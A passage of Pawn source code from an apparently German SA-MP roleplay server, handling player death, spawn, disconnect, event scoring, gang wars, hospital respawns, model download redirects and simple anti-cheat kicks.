    if(tutorialcp[playerid] > 0)
    {
        KillTimer(TUTTIMER[playerid]);
    }
	if(in_event[playerid]==true)
	{
		event_leave_player(playerid);
		in_event[playerid]=false;
		event_kills[playerid]=0;
		jpbereits[playerid] = 0;
		if(event_players == 1 || event_players == 0)
        {
            new str[265];
        	format(str,sizeof(str),"{FFBF00}[Event Park]{FFBF00} Eventpark geschlossen! Zu wenige Spieler!",PlayerName(playerid));
        	sendEventMsg(str);
            event_stop();
        }
	}
 	if(event_leaderID==playerid)
    {
        event_leaderID=-1;
        event_firstblood=false;
        new str[128];
        format(str,sizeof(str),"{FFBF00}[Event Park] {9F81F7}%s{FFBF00} hat als 1. Platz das Event verlassen. Der nächste Kill führt!!",PlayerName(playerid));
        sendEventMsg(str);
        if(event_players == 1 || event_players == 0)
        {
            event_stop();
        }
    }
	if(Ticketmerk[playerid] >= 0)
	{
 		SendClientMessage(Ticketmerk[Ticketmerk[playerid]],COLOR_GREEN,"Support beendet!");
 		Ticketmerk[Ticketmerk[playerid]] = -1;
 		Ticketmerk[playerid] = -1;
	}
	if(Ticketplayer[playerid] == 1)
	{
 		Ticketplayer[playerid] = 0;
	}
	if(spielerw1 == playerid || spielerw2 == playerid)
	{
	    SendClientMessage(playerid,COLOR_RED,"Dein Gegner hat das Spiel verlassen!");
		kannwuerfel = 0;
		wuerfelgeld = 0.0;
	 	spielerw1 = -1;
	 	spielerw2 = -1;
	}
 	new string[30];
	format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
	/*new string2[5];
	format(string2,5,"%d",on);
	mysqlupdate("user",string,"eingeloggt",string2);*/
   	ci_map_blink[playerid]=false;KillTimer(ci_map_blinkTM[playerid]);
	ci_map_selected[playerid]=0;ci_map_state[playerid]=false;
	SpielerInfo[playerid][uWantedLevel] = 0;
	SpielerInfo[playerid][uEingeloggt] = 0;
    return 1;
}
public OnPlayerDeath(playerid, killerid, reason)
{
    new str[358],string[400], Float:plx, Float:ply, Float:plz;
	GetPlayerPos(playerid,plx,ply,plz);
	todx[playerid] =    plx;
	tody[playerid] =    ply;
	todz[playerid] =    plz;
    Geldnichterhalten(playerid);
    SetPlayerColor(playerid, COLOR_OFF);

   	PlayerTextDrawHide(playerid, GeldAnzeigewert[playerid]);
	PlayerTextDrawShow(playerid, GeldAnzeigewert[playerid]);
	PlayerTextDrawShow(playerid, Orttext[playerid]);

    if(playerid == bombenspieler) {
	    Atombombeabbruchtot();
	}

	RemovePlayerAttachedObject(playerid, MAX_PLAYER_ATTACHED_OBJECTS - 2);
	Maskex[playerid] = false;
	SpielerInfo[playerid][uTode]++;
	GebeLeben(playerid, 99.8);
    Verhungern[playerid] = 0;
    ppMaske[playerid] = 0;
    AntiCheat[playerid][cAnti] = 2;
    SpielerInfo[playerid][uHunger] = 100;
    HatTaser[playerid] = 0;
    SpielerInfo[playerid][uDienst] = 0;
    HandyAn[playerid] = 0;
    ResetWeapons(playerid);

	if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
	if(Spectate[playerid] != -1) {
	    TogglePlayerSpectating(playerid, 0);
	    Spectate[playerid] = -1;
	}

	for(new x; x < sizeof(UserBr); x++) {
	    TextDrawHideForPlayer(playerid,UserBr[x]);
		TextDrawShowForPlayer(playerid,UserBr[x]);
	}
    WFrak(playerid);
    if(killerid != INVALID_PLAYER_ID) {
    	WFrak(killerid);
   	}

	if(killerid != INVALID_PLAYER_ID) {

	    SpielerInfo[killerid][uKills]++;

	    if(in_event[playerid] == true && in_event[killerid] == true) {
			switch(event_art) {
				case 1: {
				    event_kills[killerid]++;
				    if(event_firstblood == false) {
						event_leaderID = killerid;
						event_firstblood = true;
					}
					for(new i; i < GetMaxPlayers(); i++) {
						if(IsPlayerConnected(i) && in_event[i] == true) {
							SendDeathMessageToPlayer(i, killerid, playerid, reason);
						}
					}
					if(event_kills[killerid] > event_kills[event_leaderID]) {
						format(str,sizeof(str),"{FFBF00}[Event Park] {9F81F7}%s{FFBF00} ist nun in Führung mit: {9F81F7}%i{FFBF00} Kills!", PlayerName(killerid), event_kills[killerid]);
						sendEventMsg(str);
						event_leaderID = killerid;
					}
					GameTextForPlayer(killerid, "~g~+ 1 Kill", 4000, 3);
				}
			}
			return 1;
		}

	    if(SpielerInfo[playerid][uWantedLevel] > 0) {
			if(IstSpielerInFrak(killerid, 1) || IstSpielerInFrak(killerid, 2) || IstSpielerInFrak(killerid, 15)) {
	    	    SpielerInfo[playerid][uTod] = 0;
	    	    new Float:preis = SpielerInfo[playerid][uWantedLevel] * 40;
	    	    new zeit = SpielerInfo[playerid][uWantedLevel];
	   			GebeGeld(playerid,-preis);
				if(SpielerInfo[killerid][uLeiter] > 0) {Fraktionskasse[SpielerInfo[killerid][uLeiter]]+=(preis-preis/10.0); Frakkassespeichern(SpielerInfo[killerid][uLeiter]);}
				else {Fraktionskasse[SpielerInfo[killerid][uMitglied]]+=(preis-preis/10.0); Frakkassespeichern(SpielerInfo[killerid][uMitglied]);}
				GebeGeld(killerid,preis/10);
				SpielerInfo[playerid][uWantedLevel] = 0;
				SpielerInfo[playerid][uKnastZeit] = zeit*60;
				format(string,sizeof string,"Du hast %s abgeschossen! Er wird %d Minuten für %.2f$ Bußgeld eingesperrt! Belohnung: %.2f$",PlayerName(playerid),zeit,preis,preis/2);
				SendClientMessage(killerid,COLOR_GREEN,string);
				format(string,sizeof string,"Du wurdest von %s abgeschossen und automatisch %d Minuten für %.2f$ Bußgeld eingesperrt!",PlayerName(killerid),zeit,preis);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				if(IstSpielerInFrak(killerid, 1)) {
					new rand = random(sizeof(KnastSpawns));
					Streamer_UpdateEx(playerid,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
					Teleport(playerid,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
					SpielerInfo[playerid][uGefangen] = 1;
				}
				else if(IstSpielerInFrak(killerid, 2)) {
				    new rand = random(sizeof(KnastSpawnsSF));
					Streamer_UpdateEx(playerid,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
					Teleport(playerid,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
					SpielerInfo[playerid][uGefangen] = 2;
				}
				else if(IstSpielerInFrak(killerid, 15)) {
				    new rand = random(sizeof(KnastSpawnsARMY));
					Streamer_UpdateEx(playerid,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
					Teleport(playerid,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
					SpielerInfo[playerid][uGefangen] = 3;
				}
				return 1;
	    	}
		}

		if(SpielerInfo[playerid][uKnastZeit] == 0) {
			new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
		    new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6452.5493,-7724.9258,4.3736);
		    if(LS12 > SF12) {
	     		SpielerInfo[playerid][uPosX] = 6456.0259;
		        SpielerInfo[playerid][uPosY] = -7729.9888;
		        SpielerInfo[playerid][uPosZ] = 4.3736;
		        SpielerInfo[playerid][uTod] = 7;
		    } else if(SF12 > LS12) {
		        new rand = random(sizeof(khspawn));
				SpielerInfo[playerid][uPosX] = khspawn[rand][0];
		        SpielerInfo[playerid][uPosY] = khspawn[rand][1];
		        SpielerInfo[playerid][uPosZ] = khspawn[rand][2];
		    	SpielerInfo[playerid][uTod] = 8;
		    }
		}

		if(Mitglied[playerid] == gangwarteam1 && Mitglied[killerid] == gangwarteam2 && in_event[playerid] == false) {
		    GameTextForPlayer(killerid,"~g~Gangwarkill",1000,3);
		    GameTextForPlayer(playerid,"~r~Gangwarkill",1000,3);
	     	GebeGeld(killerid, 20);
		    gangwarteam2kills += 5;
		    //Punkt angreifer
	   		format(string,sizeof(string),"%s hat %s in der Gangwarzone niedergeschossen! (+5 Punkt)",PlayerName(killerid),PlayerName(playerid));
		    FraktionsNachricht(gangwarteam1,COLOR_GREEN,string);
		    FraktionsNachricht(gangwarteam2,COLOR_GREEN,string);
		    SpielerInfo[playerid][uTod] = 0;
		} else if(Mitglied[playerid] == gangwarteam2 && Mitglied[killerid] == gangwarteam1 && in_event[playerid] == false) {
	 		GameTextForPlayer(killerid,"~g~Gangwarkill",1000,3);
		    GameTextForPlayer(playerid,"~r~Gangwarkill",1000,3);
		    GebeGeld(killerid, 20);
		    gangwarteam1kills += 5;
	   		format(string,sizeof(string),"%s hat %s in der Gangwarzone niedergeschossen! (+5 Punkt)",PlayerName(killerid),PlayerName(playerid));
		    FraktionsNachricht(gangwarteam1,COLOR_GREEN,string);
		    FraktionsNachricht(gangwarteam2,COLOR_GREEN,string);
		    SpielerInfo[playerid][uTod] = 0;
		}

        if(!IsPlayerStreamedIn(playerid, killerid)) {
            if(AdminsConnected() == 0) {
		 	    SendClientMessage(playerid,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Kill Hack!");
			    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Kill Hack",PlayerName(playerid));
				SendMessageToAll(COLOR_LIGHTRED,string);
	    		KWBLog(PlayerName(playerid),"System","Kick","Kill Hack");
	    		Kick(playerid);
			} else {
	        	format(string,sizeof string,"%s steht unter Killhackwarnung, Opfer: %s", PlayerName(playerid),PlayerName(killerid));
				SendAdminMessage(COLOR_LIGHTRED,string,1);
			}
        }

	    format(str,sizeof(str),"%s hat %s gekillt Waffe: %s",PlayerName(killerid),PlayerName(playerid),WaffenName[reason]);
    	log(playerid, 4, str);

	}
	if(SpielerInfo[playerid][uKnastZeit] == 0) {
		new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
	    new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6452.5493,-7724.9258,4.3736);
	    if(LS12 > SF12) {
     		SpielerInfo[playerid][uPosX] = 6456.0259;
	        SpielerInfo[playerid][uPosY] = -7729.9888;
	        SpielerInfo[playerid][uPosZ] = 4.3736;
	        SpielerInfo[playerid][uTod] = 7;
	        SendClientMessage(playerid,COLOR_ORANGE,"Du bist gestorben und wirst in kürze dem Krankenhaus von Santa Felton zugeführt.");
	    } else if(SF12 > LS12) {
	        new rand = random(sizeof(khspawn));
			SpielerInfo[playerid][uPosX] = khspawn[rand][0];
	        SpielerInfo[playerid][uPosY] = khspawn[rand][1];
	        SpielerInfo[playerid][uPosZ] = khspawn[rand][2];
	    	SpielerInfo[playerid][uTod] = 8;
	    	SendClientMessage(playerid,COLOR_ORANGE,"Du bist gestorben und wirst in kürze dem Krankenhaus von Lake Sorten zugeführt.");
	    }
	}
	return 1;
}

public OnLightFlash(vehicleid)
{
    	new panels, doors, lights, tires;
        GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);

        switch(Flash[vehicleid])
        {
        case 0: UpdateVehicleDamageStatus(vehicleid, panels, doors, 2, tires);

            case 1: UpdateVehicleDamageStatus(vehicleid, panels, doors, 5, tires);

            case 2: UpdateVehicleDamageStatus(vehicleid, panels, doors, 2, tires);

            case 3: UpdateVehicleDamageStatus(vehicleid, panels, doors, 4, tires);

            case 4: UpdateVehicleDamageStatus(vehicleid, panels, doors, 5, tires);

            case 5: UpdateVehicleDamageStatus(vehicleid, panels, doors, 4, tires);
        }
        if(Flash[vehicleid] >=5) Flash[vehicleid] = 0;
        else Flash[vehicleid] ++;
        return 1;
}

public OnVehicleSpawn(vehicleid)
{
    if(B_IsTrailer(vehicleid))
    {
        new veh;
        if((veh = TrailerVehicle[vehicleid]) != 0)
        {
            if(IsCarBlinking(veh))
            {
                DestroyDynamicObject(Blink[veh][1]);
                DestroyDynamicObject(Blink[veh][3]);
                Blink[veh][1] = -1;
                Blink[veh][3] = -1;
            }
        }
    }
    else DisableCarBlinking(vehicleid);
    return 1;
}

public OnVehicleSirenStateChange(playerid, vehicleid, newstate)
{
        /*if(newstate)
        {
            FlashTime[vehicleid] = SetTimerEx("OnLightFlash", flashtime, true, "d", vehicleid);
        }

        if(!newstate)
        {
      		new panels, doors, lights, tires;
			KillTimer(FlashTime[vehicleid]);
			GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
            UpdateVehicleDamageStatus(vehicleid, panels, doors, 0, tires);
        }*/
        return 1;
}//flashlight

public OnPlayerSpawn(playerid)
{
    RemovePlayerAttachedObject(playerid, MAX_PLAYER_ATTACHED_OBJECTS - 2);
	Maskex[playerid] = false;
    GebeLeben(playerid,99.8);
	if(IsPlayerNPC(playerid)) {
	    Unfreeze(playerid);
	    if(!strcmp(PlayerName(playerid),"SchwarzMarkt",false)) {
	    	SetPlayerSkin(playerid,162);
	    	ApplyAnimation(playerid,"PED","SEAT_IDLE",4.2,1,0,0,0,0,1);
	    }
   	} else {
        if(in_event[playerid] == true) {
        	event_spawn_player(playerid);
        	SpielerInfo[playerid][uTod] = 0;
        }
        for(new x; x < sizeof(GangwarT); x++) {
			TextDrawHideForPlayer(playerid,GangwarT[x]);
		}
        WFrak(playerid);
        if(Mitglied[playerid] == gangwarteam1 || Mitglied[playerid] == gangwarteam2) {
            SendClientMessage(playerid,COLOR_RED,"Deine Fraktion befindet sich in einem Gangwar!");
            for(new x = 0; x < sizeof(GangwarT); x++) TextDrawShowForPlayer(playerid,GangwarT[x]);
            if(gangwarteam2 == 7) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_BALLAS);
			} else if(gangwarteam2 == 8) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_GROVE);
			} else if(gangwarteam2 == 9) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_ATZE);
			} else if(gangwarteam2 == 10) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_LCN);
			} else if(gangwarteam2 == 16) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_VAGOS);
			} else if(gangwarteam2 == 11) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_YAKUZA);
			} else if(gangwarteam2 == 17) {
			    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_Mayans_MC);
			} if(IstSpielerInFrak(playerid, 7)) {
			    Streamer_UpdateEx(playerid,1713.4614,-8845.9609,5.2003);
	            Teleport(playerid,1713.4614,-8845.9609,5.2003);
			} else if(IstSpielerInFrak(playerid, 8)) {
			    Streamer_UpdateEx(playerid,4419.6284,-7621.2588,7.1832);
	            Teleport(playerid,4419.6284,-7621.2588,7.1832);
			} else if(IstSpielerInFrak(playerid, 9)) {
			    Streamer_UpdateEx(playerid,4221.0908,-7639.0205,5.7251);
	            Teleport(playerid,4221.0908,-7639.0205,5.7251);
			} else if(IstSpielerInFrak(playerid, 10)) {
			    Streamer_UpdateEx(playerid,6365.9180,-9351.6240,4.4984);
	            Teleport(playerid,6365.9180,-9351.6240,4.4984);
			} else if(IstSpielerInFrak(playerid, 11)) {
			    Streamer_UpdateEx(playerid,3165.6084,-9237.7773,5.8646);
	            Teleport(playerid,3165.6084,-9237.7773,5.8646);
			} else if(IstSpielerInFrak(playerid, 16)) {
			    Streamer_UpdateEx(playerid,6360.8535,-9130.2490,6.5073);
	            Teleport(playerid,6360.8535,-9130.2490,6.5073);
			} else if(IstSpielerInFrak(playerid, 17)) {
			    Streamer_UpdateEx(playerid,3735.6653,-9336.8818,9.7867);
	            Teleport(playerid,3735.6653,-9336.8818,9.7867);
			}
		}
   	    AntiCheat[playerid][cAnti] = 2;
   	    if(SpielerInfo[playerid][uZiviFrak] == 0) {
   	        SetPlayerSkin(playerid,SpielerInfo[playerid][uZiviSkin]);
   	    } else {
			SetPlayerSkin(playerid,SpielerInfo[playerid][uSkin]);
		}
		SetPlayerColor(playerid,0xFFFFFFFF);
	    if(SpielerInfo[playerid][uTod] == 1 || SpielerInfo[playerid][uTod] == 7 || SpielerInfo[playerid][uTod] == 8) {
	        new medics;
  			for(new i = 0; i < MAX_PLAYERS; i++) {
			    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,3)) || IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,4))) {
			        medics++;
			        printf("%d",medics);
			        if(medics == 1) break;
			    }
			} if(medics > 0) {
			    new string[120];
		        new Float:plx, Float:ply, Float:plz;
		        plx = todx[playerid];
				ply = tody[playerid];
				plz = todz[playerid];
		        ClearAnimations(playerid);
		        SendClientMessage(playerid,COLOR_ORANGE,"Das Fire & Rescue Department wurde alarmiert.");
		        Streamer_UpdateEx(playerid, plx, ply, plz);
		        Teleport(playerid, plx, ply, plz);
		        SetPlayerCameraPos(playerid, plx+5, ply+5, plz+10);
		        SetPlayerCameraLookAt(playerid, plx, ply, plz);
				Freeze(playerid);
		        ApplyAnimation(playerid, "CRACK", "CRCKIDLE2", 4.2, 1, 0, 0, 1, 0, 1);
		        SetTimerEx("Ami",1000,0,"d",playerid);
		        timerxd[playerid] = SetTimerEx("TPKH",120000,0,"d",playerid);
       			if(SpielerInfo[playerid][uTod] == 7) {
			        format(string,sizeof(string),"%s muss wiederbelebt werden! Verwende: /auftrag (Geeignet für: MDSF)",PlayerName(playerid));
			    } else if(SpielerInfo[playerid][uTod] == 8) {
			        format(string,sizeof(string),"%s muss wiederbelebt werden! Verwende: /auftrag (Geeignet für: MDLS)",PlayerName(playerid));
			    }
				FraktionsNachricht(3, COLOR_LIGHTBLUE,string);
				FraktionsNachricht(4, COLOR_LIGHTBLUE,string);
				Auftragaktiv[playerid] = 1;
				GebeLeben(playerid,20);
			} else {
			    ClearAnimations(playerid);
			    Freeze(playerid);
			    SetPlayerVirtualWorld(playerid, 0);
			    if(SpielerInfo[playerid][uTod] == 7) {
			        Teleport(playerid,6456.0259,-7729.9888,4.3736);
			        SetPlayerCameraPos(playerid,6426.5171,-7712.2026,4.2186+7);
			        SetPlayerCameraLookAt(playerid,6456.0259,-7729.9888,4.3736);
			        SendClientMessage(playerid,COLOR_ORANGE,"Du wirst im Krankenhaus Santa Felton behandelt.");
			        Freeze(playerid);
			        GebeLeben(playerid,20);
			    } else if(SpielerInfo[playerid][uTod] == 8) {
			    	new rand = random(sizeof(khspawn));
			        SendClientMessage(playerid,COLOR_ORANGE,"Du wirst im Krankenhaus Lake Sorten behandelt.");
			        Teleport(playerid,khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
			        SetPlayerCameraPos(playerid,1768.8988,-9323.4424,7.9100+1);
			        SetPlayerCameraLookAt(playerid,khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
			        ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
			        SetTimerEx("khani",500,0,"d",playerid);
			        SetPlayerFacingAngle(playerid, 180);
			        Freeze(playerid);
			        GebeLeben(playerid, 20);
			    }
                SpielerInfo[playerid][uTod] = 1;
                timerxd2[playerid] = SetTimerEx("Leben",90000,0,"d",playerid);
			}
		}
        if(SpielerInfo[playerid][uTod] == 4) {
		    ClearAnimations(playerid);
		    Freeze(playerid);
		    SetPlayerVirtualWorld(playerid,0);
			new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
		    new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6452.5493,-7724.9258,4.3736);
		    if(LS12 > SF12) {
		        Teleport(playerid,6456.0259,-7729.9888,4.3736);
		        SetPlayerCameraPos(playerid,6426.5171,-7712.2026,4.2186+7);
		        SetPlayerCameraLookAt(playerid,6456.0259,-7729.9888,4.3736);
		        SendClientMessage(playerid,COLOR_ORANGE,"[ANTI-OFFLINE]: Du wirst im Krankenhaus Santa Felton behandelt.");
		    } else if(SF12 > LS12) {
		    	new rand = random(sizeof(khspawn));
		        SendClientMessage(playerid,COLOR_ORANGE,"[ANTI-OFFLINE]: Du wirst im Krankenhaus Lake Sorten behandelt.");
		        Teleport(playerid,khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
		        SetPlayerCameraPos(playerid,1768.8988,-9323.4424,7.9100+1);
		        SetPlayerCameraLookAt(playerid,khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
		        ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
		        SetPlayerFacingAngle(playerid,180);
		        ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
		    }
            SpielerInfo[playerid][uTod] = 1;
            SetTimerEx("Leben",90000,0,"d",playerid);
		}
		if(SpielerInfo[playerid][uKnastZeit] > 0) {
		    if(SpielerInfo[playerid][uGefangen] == 1) {
				new rand = random(sizeof(KnastSpawns));
				Teleport(playerid,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
				Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
			} else if(SpielerInfo[playerid][uGefangen] == 2) {
				new rand = random(sizeof(KnastSpawnsSF));
				Teleport(playerid,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
				Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
			} else if(SpielerInfo[playerid][uGefangen] == 3) {
				new rand = random(sizeof(KnastSpawnsARMY));
				Teleport(playerid,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
				Freeze(playerid); SetTimerEx("Unfreeze",3000,0,"d",playerid);
			}
		} else if(Spectate[playerid] != -1 && SpielerInfo[playerid][uTod] == 0) {
	        Spectate[playerid] = -1;
	        Freeze(playerid); SetTimerEx("Unfreeze",2000,0,"d",playerid);
			PlayerSpawnOnPoint(playerid);
	    }
    }
    for(new x = 1; x < 13; x++)
	{
	    SpielerWaffen[playerid][x][sWaffe] = 0;
	    SpielerWaffen[playerid][x][sMuni] = 0;
	}
    return 1;
}
forward pfl(playerid);
public pfl(playerid)
{
	ApplyAnimation(playerid,"MEDIC","CPR",1.1,1, 0, 0, 1, 0, 1);
	return 1;
}
forward Ami(playerid);
public Ami(playerid)
{
	ApplyAnimation(playerid, "CRACK", "CRCKIDLE2", 4.2, 1,  0, 0, 1, 0, 1);
	return 1;
}
forward TPKH(playerid);
public TPKH(playerid)
{
    ClearAnimations(playerid);
    Freeze(playerid);
    SetPlayerVirtualWorld(playerid,0);
	new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
    new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6452.5493,-7724.9258,4.3736);
    if(LS12 > SF12)
    {
        Teleport(playerid,6456.0259,-7729.9888,4.3736);
        SetPlayerCameraPos(playerid,6426.5171,-7712.2026,4.2186+7);
        SetPlayerCameraLookAt(playerid,6456.0259,-7729.9888,4.3736);
        SendClientMessage(playerid,COLOR_ORANGE,"[ANTI-OFFLINE]: Du wirst im Krankenhaus Santa Felton behandelt.");
    }
    else if(SF12 > LS12)
    {
    	new rand = random(sizeof(khspawn));
        SendClientMessage(playerid,COLOR_ORANGE,"[ANTI-OFFLINE]: Du wirst im Krankenhaus Lake Sorten behandelt.");
        Teleport(playerid,khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
        SetPlayerCameraPos(playerid,1768.8988,-9323.4424,7.9100+1);
        SetPlayerCameraLookAt(playerid,khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
        ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
        SetPlayerFacingAngle(playerid,180);
        ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);

    }
    SpielerInfo[playerid][uTod] = 1;
	SetTimerEx("Leben",30000,0,"d",playerid);
	return 1;
}
public OnPlayerRequestClass(playerid)
{
	if(!IsPlayerNPC(playerid))
	{
	    SetSpawnInfo(playerid, 0 ,SpielerInfo[playerid][uZiviSkin], SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ], 0, 0, 0, 0, 0, 0, 0);
		SpawnPlayer(playerid);
		PlayerSpawnOnPoint(playerid);
		Freeze(playerid); SetTimerEx("Unfreeze",7000,0,"d",playerid);
		if(GetPlayerSkin(playerid) == 0)
		{
		    //Kick(playerid);
		}
	}
	return 1;
}
public OnPlayerRequestDownload(playerid, type, crc)
{
	new fullurl[256+1];
	new dlfilename[64+1];
	new foundfilename=0;
	if(!IsPlayerConnected(playerid)) return 0;
	if(type == DOWNLOAD_REQUEST_TEXTURE_FILE) {
		foundfilename = FindTextureFileNameFromCRC(crc,dlfilename,64);
	}
	else if(type == DOWNLOAD_REQUEST_MODEL_FILE) {
	    foundfilename = FindModelFileNameFromCRC(crc,dlfilename,64);
	}
	if(foundfilename) {
	    format(fullurl,256,"%s/%s",baseurl,dlfilename);
	    RedirectDownload(playerid,fullurl);
	}
	return 0;
}
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	if(GetVehicleDriver(vehicleid) == playerid && AntiCheat[playerid][cAnti] == 0)
	{
		new Float:health,string[90];
		GetVehicleHealth(vehicleid,health);
		if(health > 1000.0 && vehicleid != geldtransporter)
		{
		    if(AdminsConnected() == 0)
		    {
		    	SendClientMessage(playerid,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Tankmode!");
		 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Tankmode",PlayerName(playerid));
				SendMessageToAll(COLOR_LIGHTRED,string);
	    		KWBLog(PlayerName(playerid),"System","Kick","Tankmode");
	    		Kick(playerid);
		    }
		    else
		    {
				format(string,sizeof string,"%s steht unter Vehiclelebenshack Verdacht, Vehicle: %d.",PlayerName(playerid),vehicleid);
				SendAdminMessage(COLOR_LIGHTRED,string,1);
			}
		}
	}
    return 1;
}
Reparieren(vehicleid)
{
	AntiCheat[GetVehicleDriver(vehicleid)][cAnti] = 2;
	RepairVehicle(vehicleid);
}
public OnVehicleDeath(vehicleid, killerid)
{
    DestroyDynamicObject(sirene[vehicleid]);
    DestroyDynamicObject(sirene1[vehicleid]);
    DestroyDynamicObject(sirene2[vehicleid]);
    DestroyDynamicObject(sirene3[vehicleid]);
    DestroyDynamicObject(sirene4[vehicleid]);
    DestroyDynamicObject(g_Object[0][vehicleid]);
	DestroyDynamicObject(g_Object[1][vehicleid]);
	DestroyDynamicObject(g_Object[2][vehicleid]);
	DestroyDynamicObject(g_Object[3][vehicleid]);
	DestroyDynamicObject(g_Object[4][vehicleid]);
	DestroyDynamicObject(g_Object[5][vehicleid]);
	DestroyDynamicObject(g_Object[6][vehicleid]);
	DestroyDynamicObject(g_Object[7][vehicleid]);
	DestroyDynamicObject(g_Object[8][vehicleid]);
	DestroyDynamicObject(g_Object34[0][vehicleid]);
	DestroyDynamicObject(g_Object34[1][vehicleid]);
	DestroyDynamicObject(rustlight[0][vehicleid]);
	DestroyDynamicObject(rustlight[1][vehicleid]);
	DestroyDynamicObject(ftruck[0][vehicleid]);
	DestroyDynamicObject(ftruck[1][vehicleid]);
	DestroyDynamicObject(mullwag[0][vehicleid]);
	DestroyDynamicObject(mullwag[1][vehicleid]);
	DestroyDynamicObject(mullwag[2][vehicleid]);
	DestroyDynamicObject(mullwag[3][vehicleid]);
	DestroyDynamicObject(towlights[0][vehicleid]);
	DestroyDynamicObject(DACHAUF[vehicleid]);
	if(vehicleid == geldtransporter)
	{
	    SendClientMessageToAll(COLOR_GREEN,"* Der Geldtransporter wurde zerstört!");
	    DestroyVehicle(geldtransporter);
	    geldtransporterdriver = -1;
    	geldtransportertime = 18000;
    	geldtransporteraktiv = 0;
    	geldtransporter = -1;
	}
	if(taxilabel[vehicleid] == 1)
	{
		Delete3DTextLabel(taxitext[vehicleid]);
		taxitext[vehicleid] = Text3D:INVALID_3DTEXT_ID;
		taxilabel[vehicleid] = 0;
	}
	for(new x = 1; x < 18; x++)
	{
	    for(new y = 0; y < 20; y++)
	    {
	        if(FrakFahrzeuge[x][y][FID] == vehicleid)
	        {
	        	SetVehicleToRespawn(FrakFahrzeuge[x][y][FID]);
	        	return 1;
        	}
    	}
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	        for(new x = 0; x < 2; x++)
	        {
	            if(SAuto[i][x][sID] == vehicleid)
	            {
	                SAuto[i][x][sKilometer] = (Meter[SAuto[i][x][sID]]+GetDistanceToLastPoint(SAuto[i][x][sID])) / 250;
	                DestroyVehicle(vehicleid);
	                SendClientMessage(i,COLOR_RED,"Privatfahrzeug wurde zerstört! Benutze /reparieren");
	                SAuto[i][x][sreperatur] = 1;
	               	SAuto[i][x][sID] = -2;
	                return 1;
	            }
	        }
	    }
	}
	if(B_IsTrailer(vehicleid))
    {
        new veh;
        if((veh = TrailerVehicle[vehicleid]) != 0)
        {
            if(IsCarBlinking(veh))
            {
                DestroyDynamicObject(Blink[veh][1]);
                DestroyDynamicObject(Blink[veh][3]);
                Blink[veh][1] = -1;
                Blink[veh][3] = -1;
            }
        }
    }
    else DisableCarBlinking(vehicleid);
	return 1;
}
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
 		if(SpielerInventar[playerid][x][0] > -1)
   		{
			if(playertextid == SpielerInventarText[playerid][x+7])
			{
			    InventarClicked[playerid] = x;
